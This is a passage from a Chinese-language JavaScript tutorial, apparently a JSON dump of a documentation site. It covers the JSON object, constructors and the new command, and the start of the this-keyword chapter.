<ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/04/javascript-overview-of-regular.html\">JavaScript: an overview of the regular expression API</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions\">Regular Expressions</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/08/regexp-g.html\">The flag /g of JavaScript’s regular expressions</a></li>\n<li>Sam Hughes, <a href=\"http://qntm.org/files/re/re.html\">Learn regular expressions in about 55 minutes</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"JSON 对象","link":"/stdlib/json.html"}],"content":"\n        <h1>\n            <a href='#JSON-对象' class='header-anchor'>#</a>\n            <span>JSON 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#JSON-格式' class='header-anchor'>#</a>\n            <span>JSON 格式</span>\n        </h2>\n    <p>JSON 格式（JavaScript Object Notation 的缩写）是一种用于数据交换的文本格式，2001年由 Douglas Crockford 提出，目的是取代繁琐笨重的 XML 格式。</p>\n<p>相比 XML 格式，JSON 格式有两个显著的优点：书写简单，一目了然；符合 JavaScript 原生语法，可以由解释引擎直接处理，不用另外添加解析代码。所以，JSON 迅速被接受，已经成为各大网站交换数据的标准格式，并被写入标准。</p>\n<p>每个 JSON 对象就是一个值，可能是一个数组或对象，也可能是一个原始类型的值。总之，只能是一个值，不能是两个或更多的值。</p>\n<p>JSON 对值的类型和格式有严格的规定。</p>\n<blockquote>\n<ol>\n<li><p>复合类型的值只能是数组或对象，不能是函数、正则表达式对象、日期对象。</p>\n</li>\n<li><p>原始类型的值只有四种：字符串、数值（必须以十进制表示）、布尔值和<code>null</code>（不能使用<code>NaN</code>, <code>Infinity</code>, <code>-Infinity</code>和<code>undefined</code>）。</p>\n</li>\n<li><p>字符串必须使用双引号表示，不能使用单引号。</p>\n</li>\n<li><p>对象的键名必须放在双引号里面。</p>\n</li>\n<li><p>数组或对象最后一个成员的后面，不能加逗号。</p>\n</li>\n</ol>\n</blockquote>\n<p>以下都是合法的 JSON。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]\n\n{ &quot;one&quot;: 1, &quot;two&quot;: 2, &quot;three&quot;: 3 }\n\n{&quot;names&quot;: [&quot;张三&quot;, &quot;李四&quot;] }\n\n[ { &quot;name&quot;: &quot;张三&quot;}, {&quot;name&quot;: &quot;李四&quot;} ]</code></pre><p>以下都是不合法的 JSON。</p>\n<pre class=\"prettyprint language-javascript\"><code>{ name: &quot;张三&quot;, &#039;age&#039;: 32 }  // 属性名必须使用双引号\n\n[32, 64, 128, 0xFFF] // 不能使用十六进制值\n\n{ &quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: undefined } // 不能使用 undefined\n\n{ &quot;name&quot;: &quot;张三&quot;,\n  &quot;birthday&quot;: new Date(&#039;Fri, 26 Aug 2011 07:13:10 GMT&#039;),\n  &quot;getName&quot;: function () {\n      return this.name;\n  }\n} // 属性值不能使用函数和日期对象</code></pre><p>注意，<code>null</code>、空数组和空对象都是合法的 JSON 值。</p>\n\n        <h2>\n            <a href='#JSON-对象' class='header-anchor'>#</a>\n            <span>JSON 对象</span>\n        </h2>\n    <p><code>JSON</code>对象是 JavaScript 的原生对象，用来处理 JSON 格式数据。它有两个静态方法：<code>JSON.stringify()</code>和<code>JSON.parse()</code>。</p>\n\n        <h2>\n            <a href='#JSON.stringify()' class='header-anchor'>#</a>\n            <span>JSON.stringify()</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本用法' class='header-anchor'>#</a>\n            <span>基本用法</span>\n        </h3>\n    <p><code>JSON.stringify</code>方法用于将一个值转为 JSON 字符串。该字符串符合 JSON 格式，并且可以被<code>JSON.parse</code>方法还原。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.stringify(&#039;abc&#039;) // &quot;&quot;abc&quot;&quot;\nJSON.stringify(1) // &quot;1&quot;\nJSON.stringify(false) // &quot;false&quot;\nJSON.stringify([]) // &quot;[]&quot;\nJSON.stringify({}) // &quot;{}&quot;\n\nJSON.stringify([1, &quot;false&quot;, false])\n// &#039;[1,&quot;false&quot;,false]&#039;\n\nJSON.stringify({ name: &quot;张三&quot; })\n// &#039;{&quot;name&quot;:&quot;张三&quot;}&#039;</code></pre><p>上面代码将各种类型的值，转成 JSON 字符串。</p>\n<p>注意，对于原始类型的字符串，转换结果会带双引号。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.stringify(&#039;foo&#039;) === &quot;foo&quot; // false\nJSON.stringify(&#039;foo&#039;) === &quot;\\&quot;foo\\&quot;&quot; // true</code></pre><p>上面代码中，字符串<code>foo</code>，被转成了<code>&quot;\\&quot;foo&quot;\\&quot;</code>。这是因为将来还原的时候，内层双引号可以让 JavaScript 引擎知道，这是一个字符串，而不是其他类型的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.stringify(false) // &quot;false&quot;\nJSON.stringify(&#039;false&#039;) // &quot;\\&quot;false\\&quot;&quot;</code></pre><p>上面代码中，如果不是内层的双引号，将来还原的时候，引擎就无法知道原始值是布尔值还是字符串。</p>\n<p>如果对象的属性是<code>undefined</code>、函数或 XML 对象，该属性会被<code>JSON.stringify</code>过滤。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  a: undefined,\n  b: function () {}\n};\n\nJSON.stringify(obj) // &quot;{}&quot;</code></pre><p>上面代码中，对象<code>obj</code>的<code>a</code>属性是<code>undefined</code>，而<code>b</code>属性是一个函数，结果都被<code>JSON.stringify</code>过滤。</p>\n<p>如果数组的成员是<code>undefined</code>、函数或 XML 对象，则这些值被转成<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [undefined, function () {}];\nJSON.stringify(arr) // &quot;[null,null]&quot;</code></pre><p>上面代码中，数组<code>arr</code>的成员是<code>undefined</code>和函数，它们都被转成了<code>null</code>。</p>\n<p>正则对象会被转成空对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.stringify(/foo/) // &quot;{}&quot;</code></pre><p><code>JSON.stringify</code>方法会忽略对象的不可遍历属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nObject.defineProperties(obj, {\n  &#039;foo&#039;: {\n    value: 1,\n    enumerable: true\n  },\n  &#039;bar&#039;: {\n    value: 2,\n    enumerable: false\n  }\n});\n\nJSON.stringify(obj); // &quot;{&quot;foo&quot;:1}&quot;</code></pre><p>上面代码中，<code>bar</code>是<code>obj</code>对象的不可遍历属性，<code>JSON.stringify</code>方法会忽略这个属性。</p>\n\n        <h3>\n            <a href='#第二个参数' class='header-anchor'>#</a>\n            <span>第二个参数</span>\n        </h3>\n    <p><code>JSON.stringify</code>方法还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  &#039;prop1&#039;: &#039;value1&#039;,\n  &#039;prop2&#039;: &#039;value2&#039;,\n  &#039;prop3&#039;: &#039;value3&#039;\n};\n\nvar selectedProperties = [&#039;prop1&#039;, &#039;prop2&#039;];\n\nJSON.stringify(obj, selectedProperties)\n// &quot;{&quot;prop1&quot;:&quot;value1&quot;,&quot;prop2&quot;:&quot;value2&quot;}&quot;</code></pre><p>上面代码中，<code>JSON.stringify</code>方法的第二个参数指定，只转<code>prop1</code>和<code>prop2</code>两个属性。</p>\n<p>这个类似白名单的数组，只对对象的属性有效，对数组无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.stringify([&#039;a&#039;, &#039;b&#039;], [&#039;0&#039;])\n// &quot;[&quot;a&quot;,&quot;b&quot;]&quot;\n\nJSON.stringify({0: &#039;a&#039;, 1: &#039;b&#039;}, [&#039;0&#039;])\n// &quot;{&quot;0&quot;:&quot;a&quot;}&quot;</code></pre><p>上面代码中，第二个参数指定 JSON 格式只转<code>0</code>号属性，实际上对数组是无效的，只对对象有效。</p>\n<p>第二个参数还可以是一个函数，用来更改<code>JSON.stringify</code>的返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(key, value) {\n  if (typeof value === &quot;number&quot;) {\n    value = 2 * value;\n  }\n  return value;\n}\n\nJSON.stringify({ a: 1, b: 2 }, f)\n// &#039;{&quot;a&quot;: 2,&quot;b&quot;: 4}&#039;</code></pre><p>上面代码中的<code>f</code>函数，接受两个参数，分别是被转换的对象的键名和键值。如果键值是数值，就将它乘以<code>2</code>，否则就原样返回。</p>\n<p>注意，这个处理函数是递归处理所有的键。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {a: {b: 1}};\n\nfunction f(key, value) {\n  console.log(&quot;[&quot;+ key +&quot;]:&quot; + value);\n  return value;\n}\n\nJSON.stringify(o, f)\n// []:[object Object]\n// [a]:[object Object]\n// [b]:1\n// &#039;{&quot;a&quot;:{&quot;b&quot;:1}}&#039;</code></pre><p>上面代码中，对象<code>o</code>一共会被<code>f</code>函数处理三次，最后那行是<code>JSON.stringify</code>的输出。第一次键名为空，键值是整个对象<code>o</code>；第二次键名为<code>a</code>，键值是<code>{b: 1}</code>；第三次键名为<code>b</code>，键值为1。</p>\n<p>递归处理中，每一次处理的对象，都是前一次返回的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {a: 1};\n\nfunction f(key, value) {\n  if (typeof value === &#039;object&#039;) {\n    return {b: 2};\n  }\n  return value * 2;\n}\n\nJSON.stringify(o, f)\n// &quot;{&quot;b&quot;: 4}&quot;</code></pre><p>上面代码中，<code>f</code>函数修改了对象<code>o</code>，接着<code>JSON.stringify</code>方法就递归处理修改后的对象<code>o</code>。</p>\n<p>如果处理函数返回<code>undefined</code>或没有返回值，则该属性会被忽略。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(key, value) {\n  if (typeof(value) === &quot;string&quot;) {\n    return undefined;\n  }\n  return value;\n}\n\nJSON.stringify({ a: &quot;abc&quot;, b: 123 }, f)\n// &#039;{&quot;b&quot;: 123}&#039;</code></pre><p>上面代码中，<code>a</code>属性经过处理后，返回<code>undefined</code>，于是该属性被忽略了。</p>\n\n        <h3>\n            <a href='#第三个参数' class='header-anchor'>#</a>\n            <span>第三个参数</span>\n        </h3>\n    <p><code>JSON.stringify</code>还可以接受第三个参数，用于增加返回的 JSON 字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.stringify({ p1: 1, p2: 2 }, null, 2);\n/*\n&quot;{\n  &quot;p1&quot;: 1,\n  &quot;p2&quot;: 2\n}&quot;\n*/\n\nJSON.stringify({ p1:1, p2:2 }, null, &#039;|-&#039;);\n/*\n&quot;{\n|-&quot;p1&quot;: 1,\n|-&quot;p2&quot;: 2\n}&quot;\n*/</code></pre>\n        <h3>\n            <a href='#参数对象的-toJSON-方法' class='header-anchor'>#</a>\n            <span>参数对象的 toJSON 方法</span>\n        </h3>\n    <p>如果参数对象有自定义的<code>toJSON</code>方法，那么<code>JSON.stringify</code>会使用这个方法的返回值作为参数，而忽略原对象的其他属性。</p>\n<p>下面是一个普通的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var user = {\n  firstName: &#039;三&#039;,\n  lastName: &#039;张&#039;,\n\n  get fullName(){\n    return this.lastName + this.firstName;\n  }\n};\n\nJSON.stringify(user)\n// &quot;{&quot;firstName&quot;:&quot;三&quot;,&quot;lastName&quot;:&quot;张&quot;,&quot;fullName&quot;:&quot;张三&quot;}&quot;</code></pre><p>现在，为这个对象加上<code>toJSON</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var user = {\n  firstName: &#039;三&#039;,\n  lastName: &#039;张&#039;,\n\n  get fullName(){\n    return this.lastName + this.firstName;\n  },\n\n  toJSON: function () {\n    return {\n      name: this.lastName + this.firstName\n    };\n  }\n};\n\nJSON.stringify(user)\n// &quot;{&quot;name&quot;:&quot;张三&quot;}&quot;</code></pre><p>上面代码中，<code>JSON.stringify</code>发现参数对象有<code>toJSON</code>方法，就直接使用这个方法的返回值作为参数，而忽略原对象的其他参数。</p>\n<p><code>Date</code>对象就有一个自己的<code>toJSON</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var date = new Date(&#039;2015-01-01&#039;);\ndate.toJSON() // &quot;2015-01-01T00:00:00.000Z&quot;\nJSON.stringify(date) // &quot;&quot;2015-01-01T00:00:00.000Z&quot;&quot;</code></pre><p>上面代码中，<code>JSON.stringify</code>发现处理的是<code>Date</code>对象实例，就会调用这个实例对象的<code>toJSON</code>方法，将该方法的返回值作为参数。</p>\n<p><code>toJSON</code>方法的一个应用是，将正则对象自动转为字符串。因为<code>JSON.stringify</code>默认不能转换正则对象，但是设置了<code>toJSON</code>方法以后，就可以转换正则对象了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  reg: /foo/\n};\n\n// 不设置 toJSON 方法时\nJSON.stringify(obj) // &quot;{&quot;reg&quot;:{}}&quot;\n\n// 设置 toJSON 方法时\nRegExp.prototype.toJSON = RegExp.prototype.toString;\nJSON.stringify(/foo/) // &quot;&quot;/foo/&quot;&quot;</code></pre><p>上面代码在正则对象的原型上面部署了<code>toJSON</code>方法，将其指向<code>toString</code>方法，因此遇到转换成<code>JSON</code>时，正则对象就先调用<code>toJSON</code>方法转为字符串，然后再被<code>JSON.stingify</code>方法处理。</p>\n\n        <h2>\n            <a href='#JSON.parse()' class='header-anchor'>#</a>\n            <span>JSON.parse()</span>\n        </h2>\n    <p><code>JSON.parse</code>方法用于将 JSON 字符串转换成对应的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.parse(&#039;{}&#039;) // {}\nJSON.parse(&#039;true&#039;) // true\nJSON.parse(&#039;&quot;foo&quot;&#039;) // &quot;foo&quot;\nJSON.parse(&#039;[1, 5, &quot;false&quot;]&#039;) // [1, 5, &quot;false&quot;]\nJSON.parse(&#039;null&#039;) // null\n\nvar o = JSON.parse(&#039;{&quot;name&quot;: &quot;张三&quot;}&#039;);\no.name // 张三</code></pre><p>如果传入的字符串不是有效的 JSON 格式，<code>JSON.parse</code>方法将报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.parse(&quot;&#039;String&#039;&quot;) // illegal single quotes\n// SyntaxError: Unexpected token ILLEGAL</code></pre><p>上面代码中，双引号字符串中是一个单引号字符串，因为单引号字符串不符合 JSON 格式，所以报错。</p>\n<p>为了处理解析错误，可以将<code>JSON.parse</code>方法放在<code>try...catch</code>代码块中。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  JSON.parse(&quot;&#039;String&#039;&quot;);\n} catch(e) {\n  console.log(&#039;parsing error&#039;);\n}</code></pre><p><code>JSON.parse</code>方法可以接受一个处理函数，作为第二个参数，用法与<code>JSON.stringify</code>方法类似。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(key, value) {\n  if (key === &#039;a&#039;) {\n    return value + 10;\n  }\n  return value;\n}\n\nJSON.parse(&#039;{&quot;a&quot;: 1, &quot;b&quot;: 2}&#039;, f)\n// {a: 11, b: 2}</code></pre><p>上面代码中，<code>JSON.parse</code>的第二个参数是一个函数，如果键名是<code>a</code>，该函数会将键值加上10。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>MDN, <a href=\"https://developer.mozilla.org/en-US/docs/Using_native_JSON\">Using native JSON</a></li>\n<li>MDN, <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/JSON/parse\">JSON.parse</a></li>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/08/json-api.html\">JavaScript’s JSON API</a></li>\n<li>Jim Cowart, <a href=\"http://freshbrewedcode.com/jimcowart/2013/01/29/what-you-might-not-know-about-json-stringify/\">What You Might Not Know About JSON.stringify()</a></li>\n<li>Marco Rogers polotek, <a href=\"http://docs.nodejitsu.com/articles/javascript-conventions/what-is-json\">What is JSON?</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"面向对象编程","link":"javascript:void(0)"},{"title":"实例对象与 new 命令","link":"/oop/new.html"}],"content":"\n        <h1>\n            <a href='#实例对象与-new-命令' class='header-anchor'>#</a>\n            <span>实例对象与 new 命令</span>\n        </h1>\n    <p>JavaScript 语言具有很强的面向对象编程能力，本章介绍 JavaScript 面向对象编程的基础知识。</p>\n\n        <h2>\n            <a href='#对象是什么' class='header-anchor'>#</a>\n            <span>对象是什么</span>\n        </h2>\n    <p>面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。</p>\n<p>每一个对象都是功能中心，具有明确分工，可以完成接受信息、处理数据、发出信息等任务。对象可以复用，通过继承机制还可以定制。因此，面向对象编程具有灵活、代码可复用、高度模块化等特点，容易维护和开发，比起由一系列函数或指令组成的传统的过程式编程（procedural programming），更适合多人合作的大型软件项目。</p>\n<p>那么，“对象”（object）到底是什么？我们从两个层次来理解。</p>\n<p><strong>（1）对象是单个实物的抽象。</strong></p>\n<p>一本书、一辆汽车、一个人都可以是对象，一个数据库、一张网页、一个与远程服务器的连接也可以是对象。当实物被抽象成对象，实物之间的关系就变成了对象之间的关系，从而就可以模拟现实情况，针对对象进行编程。</p>\n<p><strong>（2）对象是一个容器，封装了属性（property）和方法（method）。</strong></p>\n<p>属性是对象的状态，方法是对象的行为（完成某种任务）。比如，我们可以把动物抽象为<code>animal</code>对象，使用“属性”记录具体是那一种动物，使用“方法”表示动物的某种行为（奔跑、捕猎、休息等等）。</p>\n\n        <h2>\n            <a href='#构造函数' class='header-anchor'>#</a>\n            <span>构造函数</span>\n        </h2>\n    <p>面向对象编程的第一步，就是要生成对象。前面说过，对象是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后对象根据这个模板生成。</p>\n<p>典型的面向对象编程语言（比如 C++ 和 Java），都有“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是基于构造函数（constructor）和原型链（prototype）。</p>\n<p>JavaScript 语言使用构造函数（constructor）作为对象的模板。所谓”构造函数”，就是专门用来生成实例对象的函数。它就是对象的模板，描述实例对象的基本结构。一个构造函数，可以生成多个实例对象，这些实例对象都有相同的结构。</p>\n<p>构造函数就是一个普通的函数，但是有自己的特征和用法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var Vehicle = function () {\n  this.price = 1000;\n};</code></pre><p>上面代码中，<code>Vehicle</code>就是构造函数。为了与普通函数区别，构造函数名字的第一个字母通常大写。</p>\n<p>构造函数的特点有两个。</p>\n<ul>\n<li>函数体内部使用了<code>this</code>关键字，代表了所要生成的对象实例。</li>\n<li>生成对象的时候，必须使用<code>new</code>命令。</li>\n</ul>\n<p>下面先介绍<code>new</code>命令。</p>\n\n        <h2>\n            <a href='#new-命令' class='header-anchor'>#</a>\n            <span>new 命令</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本用法' class='header-anchor'>#</a>\n            <span>基本用法</span>\n        </h3>\n    <p><code>new</code>命令的作用，就是执行构造函数，返回一个实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var Vehicle = function () {\n  this.price = 1000;\n};\n\nvar v = new Vehicle();\nv.price // 1000</code></pre><p>上面代码通过<code>new</code>命令，让构造函数<code>Vehicle</code>生成一个实例对象，保存在变量<code>v</code>中。这个新生成的实例对象，从构造函数<code>Vehicle</code>得到了<code>price</code>属性。<code>new</code>命令执行时，构造函数内部的<code>this</code>，就代表了新生成的实例对象，<code>this.price</code>表示实例对象有一个<code>price</code>属性，值是1000。</p>\n<p>使用<code>new</code>命令时，根据需要，构造函数也可以接受参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var Vehicle = function (p) {\n  this.price = p;\n};\n\nvar v = new Vehicle(500);</code></pre><p><code>new</code>命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也可以不带括号。下面两行代码是等价的，但是为了表示这里是函数调用，推荐使用括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 推荐的写法\nvar v = new Vehicle();\n// 不推荐的写法\nvar v = new Vehicle;</code></pre><p>一个很自然的问题是，如果忘了使用<code>new</code>命令，直接调用构造函数会发生什么事？</p>\n<p>这种情况下，构造函数就变成了普通函数，并不会生成实例对象。而且由于后面会说到的原因，<code>this</code>这时代表全局对象，将造成一些意想不到的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var Vehicle = function (){\n  this.price = 1000;\n};\n\nvar v = Vehicle();\nv // undefined\nprice // 1000</code></pre><p>上面代码中，调用<code>Vehicle</code>构造函数时，忘了加上<code>new</code>命令。结果，变量<code>v</code>变成了<code>undefined</code>，而<code>price</code>属性变成了全局变量。因此，应该非常小心，避免不使用<code>new</code>命令、直接调用构造函数。</p>\n<p>为了保证构造函数必须与<code>new</code>命令一起使用，一个解决办法是，构造函数内部使用严格模式，即第一行加上<code>use strict</code>。这样的话，一旦忘了使用<code>new</code>命令，直接调用构造函数就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Fubar(foo, bar){\n  &#039;use strict&#039;;\n  this._foo = foo;\n  this._bar = bar;\n}\n\nFubar()\n// TypeError: Cannot set property &#039;_foo&#039; of undefined</code></pre><p>上面代码的<code>Fubar</code>为构造函数，<code>use strict</code>命令保证了该函数在严格模式下运行。由于严格模式中，函数内部的<code>this</code>不能指向全局对象，默认等于<code>undefined</code>，导致不加<code>new</code>调用会报错（JavaScript 不允许对<code>undefined</code>添加属性）。</p>\n<p>另一个解决办法，构造函数内部判断是否使用<code>new</code>命令，如果发现没有使用，则直接返回一个实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Fubar(foo, bar) {\n  if (!(this instanceof Fubar)) {\n    return new Fubar(foo, bar);\n  }\n\n  this._foo = foo;\n  this._bar = bar;\n}\n\nFubar(1, 2)._foo // 1\n(new Fubar(1, 2))._foo // 1</code></pre><p>上面代码中的构造函数，不管加不加<code>new</code>命令，都会得到同样的结果。</p>\n\n        <h3>\n            <a href='#new-命令的原理' class='header-anchor'>#</a>\n            <span>new 命令的原理</span>\n        </h3>\n    <p>使用<code>new</code>命令时，它后面的函数依次执行下面的步骤。</p>\n<ol>\n<li>创建一个空对象，作为将要返回的对象实例。</li>\n<li>将这个空对象的原型，指向构造函数的<code>prototype</code>属性。</li>\n<li>将这个空对象赋值给函数内部的<code>this</code>关键字。</li>\n<li>开始执行构造函数内部的代码。</li>\n</ol>\n<p>也就是说，构造函数内部，<code>this</code>指的是一个新生成的空对象，所有针对<code>this</code>的操作，都会发生在这个空对象上。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即<code>this</code>对象），将其“构造”为需要的样子。</p>\n<p>如果构造函数内部有<code>return</code>语句，而且<code>return</code>后面跟着一个对象，<code>new</code>命令会返回<code>return</code>语句指定的对象；否则，就会不管<code>return</code>语句，返回<code>this</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var Vehicle = function () {\n  this.price = 1000;\n  return 1000;\n};\n\n(new Vehicle()) === 1000\n// false</code></pre><p>上面代码中，构造函数<code>Vehicle</code>的<code>return</code>语句返回一个数值。这时，<code>new</code>命令就会忽略这个<code>return</code>语句，返回“构造”后的<code>this</code>对象。</p>\n<p>但是，如果<code>return</code>语句返回的是一个跟<code>this</code>无关的新对象，<code>new</code>命令会返回这个新对象，而不是<code>this</code>对象。这一点需要特别引起注意。</p>\n<pre class=\"prettyprint language-javascript\"><code>var Vehicle = function (){\n  this.price = 1000;\n  return { price: 2000 };\n};\n\n(new Vehicle()).price\n// 2000</code></pre><p>上面代码中，构造函数<code>Vehicle</code>的<code>return</code>语句，返回的是一个新对象。<code>new</code>命令会返回这个对象，而不是<code>this</code>对象。</p>\n<p>另一方面，如果对普通函数（内部没有<code>this</code>关键字的函数）使用<code>new</code>命令，则会返回一个空对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getMessage() {\n  return &#039;this is a message&#039;;\n}\n\nvar msg = new getMessage();\n\nmsg // {}\ntypeof msg // &quot;object&quot;</code></pre><p>上面代码中，<code>getMessage</code>是一个普通函数，返回一个字符串。对它使用<code>new</code>命令，会得到一个空对象。这是因为<code>new</code>命令总是返回一个对象，要么是实例对象，要么是<code>return</code>语句指定的对象。本例中，<code>return</code>语句返回的是字符串，所以<code>new</code>命令就忽略了该语句。</p>\n<p><code>new</code>命令简化的内部流程，可以用下面的代码表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>function _new(/* 构造函数 */ constructor, /* 构造函数参数 */ params) {\n  // 将 arguments 对象转为数组\n  var args = [].slice.call(arguments);\n  // 取出构造函数\n  var constructor = args.shift();\n  // 创建一个空对象，继承构造函数的 prototype 属性\n  var context = Object.create(constructor.prototype);\n  // 执行构造函数\n  var result = constructor.apply(context, args);\n  // 如果返回结果是对象，就直接返回，否则返回 context 对象\n  return (typeof result === &#039;object&#039; &amp;&amp; result != null) ? result : context;\n}\n\n// 实例\nvar actor = _new(Person, &#039;张三&#039;, 28);</code></pre>\n        <h3>\n            <a href='#new.target' class='header-anchor'>#</a>\n            <span>new.target</span>\n        </h3>\n    <p>函数内部可以使用<code>new.target</code>属性。如果当前函数是<code>new</code>命令调用，<code>new.target</code>指向当前函数，否则为<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  console.log(new.target === f);\n}\n\nf() // false\nnew f() // true</code></pre><p>使用这个属性，可以判断函数调用的时候，是否使用<code>new</code>命令。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  if (!new.target) {\n    throw new Error(&#039;请使用 new 命令调用！&#039;);\n  }\n  // ...\n}\n\nf() // Uncaught Error: 请使用 new 命令调用！</code></pre><p>上面代码中，构造函数<code>f</code>调用时，没有使用<code>new</code>命令，就抛出一个错误。</p>\n\n        <h2>\n            <a href='#Object.create()-创建实例对象' class='header-anchor'>#</a>\n            <span>Object.create() 创建实例对象</span>\n        </h2>\n    <p>构造函数作为模板，可以生成实例对象。但是，有时拿不到构造函数，只能拿到一个现有的对象。我们希望以这个现有的对象作为模板，生成新的实例对象，这时就可以使用<code>Object.create()</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var person1 = {\n  name: &#039;张三&#039;,\n  age: 38,\n  greeting: function() {\n    console.log(&#039;Hi! I\\&#039;m &#039; + this.name + &#039;.&#039;);\n  }\n};\n\nvar person2 = Object.create(person1);\n\nperson2.name // 张三\nperson2.greeting() // Hi! I&#039;m 张三.</code></pre><p>上面代码中，对象<code>person1</code>是<code>person2</code>的模板，后者继承了前者的属性和方法。</p>\n<p><code>Object.create()</code>的详细介绍，请看后面的相关章节。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"面向对象编程","link":"javascript:void(0)"},{"title":"this 关键字","link":"/oop/this.html"}],"content":"\n        <h1>\n            <a href='#this-关键字' class='header-anchor'>#</a>\n            <span>this 关键字</span>\n        </h1>\n    \n        <h2>\n            <a href='#涵义' class='header-anchor'>#</a>\n            <span>涵义</span>\n        </h2>\n    <p><code>this</code>关键字是一个非常重要的语法点。毫不夸张地说，不理解它的含义，大部分开发任务都无法完成。</p>\n<p>前一章已经提到，<code>this</code>可以用在构造函数之中，表示实例对象。除此之外，<code>this</code>还可以用在别的场合。但不管是什么场合，<code>this</code>都有一个共同点：它总是返回一个对象。</p>\n<p>简单说，<code>this</code>就是属性或方法“当前”所在的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>this.property</code></pre><p>上面代码中，<code>this</code>就代表<code>property</code>属性当前所在的对象。</p>\n<p>下面是一个实际的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var person = {\n  name: &#039;张三&#039;,\n  describe: function () {\n    return &#039;姓名：&#039;+ this.name;\n  }\n};\n\nperson.describe()\n// &quot;姓名：张三&quot;</code></pre><p>上面代码中，<code>this.name</code>表示<code>name</code>属性所在的那个对象。由于<code>this.name</code>是在<code>describe</code>方法中调用，而<code>describe</code>方法所在的当前对象是<code>person</code>，因此<code>this</code>指向<code>person</code>，<code>this.name</code>就是<code>person.name</code>。</p>\n<p>由于对象的属性可以赋给另一个对象，所以属性所在的当前对象是可变的，即<code>this</code>的指向是可变的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var A = {\n  name: &#039;张三&#039;,\n  describe: function () {\n    return &#039;姓名：&#039;+ this.name;\n  }\n};\n\nvar B = {\n  name: &#039;李四&#039;\n};\n\nB.describe = A.describe;\nB.describe()\n// &quot;姓名：李四&quot;</code></pre><p>上面代码中，<code>A.describe</code>属性被赋给<code>B</code>，于是<code>B.describe</code>就表示<code>describe</code>方法所在的当前对象是<code>B</code>，所以<code>this.name</code>就指向<code>B.name</code>。</p>\n<p>稍稍重构这个例子，<code>this</code>的动态指向就能看得更清楚。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  return &#039;姓名：&#039;+ this.name;\n}\n\nvar A = {\n  name: &#039;张三&#039;,\n  describe: f\n};\n\nvar B = {\n  name: &#039;李四&#039;,\n  describe: f\n};\n\nA.describe() // &quot;姓名：张三&quot;\nB.describe() // &quot;姓名：李四&quot;</code></pre><p>上面代码中，函数<code>f</code>内部使用了<code>this</code>关键字，随着<code>f</code>所在的对象不同，<code>this</code>的指向也不同。</p>\n<p>只要函数被赋给另一个变量，<code>this</code>的指向就会变。</p>\n<pre class=\"prettyprint language-javascript\"><code>var A = {\n  name: &#039;张三&#039;,\n  describe: function () {\n    return 